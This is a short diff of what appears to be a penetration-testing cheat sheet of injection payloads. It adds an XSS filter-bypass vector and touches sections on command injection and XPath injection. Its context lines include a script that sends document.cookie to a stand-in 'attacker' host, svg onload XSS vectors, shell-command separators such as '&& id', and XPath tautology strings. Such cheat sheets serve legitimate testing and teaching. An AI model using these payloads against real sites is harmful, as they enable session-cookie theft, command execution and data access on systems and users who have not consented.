@@ -86,8 +86,10 @@ XSS vectors
     *<script> new Image().src="http://attacker/bogus.php?output="+document.cookie; </script>*
     Payload no space
     *<svg/onload=alert(1)>*
+    filter bypass
+    *<svg•onload=alert(1)>*
 
-command injection
+Command injection
     *`id`
 | id
 && id
@@ -105,7 +107,7 @@ foo)
     Try wildcard ***** or partial match **a***, **ad***..
 
 
- XPath injection
+XPath injection
     *' and '1'='1
 ' or '1'='0
 ' and '1'='0
